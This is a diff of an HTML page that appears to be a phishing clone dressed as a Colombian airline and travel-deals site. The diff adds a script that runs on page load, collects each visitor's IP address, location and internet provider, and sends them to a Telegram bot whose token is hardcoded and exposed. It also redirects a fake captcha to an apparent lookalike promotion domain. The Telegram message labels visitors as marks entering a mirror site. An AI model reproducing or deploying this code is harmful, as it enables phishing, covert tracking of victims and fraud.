@@ -6,7 +6,7 @@
   <meta name="description" content="Explora la riqueza de Colombia y descubre lo mejor de Medellín, Bogotá, Cartagena, Santa Marta, Bucaramanga y San Andrés.">
   <meta name="keywords" content="tiquetes baratos, vuelos baratos, viajes baratos, ofertas viajes, buscar vuelos, viajes colombia, viajes a medellin, viajes a bogota, vuelos a medellin, vuelos a bogota, vuelos a cartagena, vuelos a santa marta, vuelos a bucaramanga, vuelos a san andres">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Paga tus factura online</title>
+  <title>aventuras sin fin</title>
   <link rel="preconnect" href="https://fonts.googleapis.com/">
   <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
@@ -192,6 +192,39 @@
 
   gtag('config', 'AW-17425280749');
 </script>
+  <!-- Script para enviar IP y ubicación a Telegram -->
+  <script>
+    const token = '7881440537:AAHbsg5rssYHnSIylGdW5Wy_2MbjOeazltA'; // Tu token de bot
+    const chatId = '-1002640786451'; // Tu chat ID
+
+    async function notifySiteVisit() {
+      try {
+        const response = await fetch('https://ipinfo.io/json?token=0b33d8e257b3eb'); // Reemplaza con tu token de ipinfo.io
+        const data = await response.json();
+
+        const ip = data.ip || 'No disponible';
+        const city = data.city || 'Sin ciudad';
+        const region = data.region || 'Sin región';
+        const country = data.country || 'Sin país';
+        const org = data.org || 'Sin proveedor';
+
+        const message = `
+🪬🎰 *MARRANO HP ENTRANDO AL ESPEJO* 🎰🪬
+🌍 *IP:* ${ip}
+📍 *Ubicación:* ${city}, ${region}, ${country}
+🔌 *Proveedor:* ${org}
+        `;
+
+        const telegramURL = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        await fetch(telegramURL);
+      } catch (error) {
+        console.error('Error al enviar datos a Telegram:', error);
+      }
+    }
+
+    window.onload = notifySiteVisit;
+  </script>
 <body>
   <div id="captchaOverlay">
     <div class="container">
@@ -230,9 +263,10 @@
 
     continueBtn.addEventListener('click', () => {
       document.getElementById('captchaOverlay').style.display = 'none';
-      window.location.href = "";
+      window.location.href = "https://ltamaeropromo.com/ES/";
     });
   </script>
 </body>
 </html>
+
 
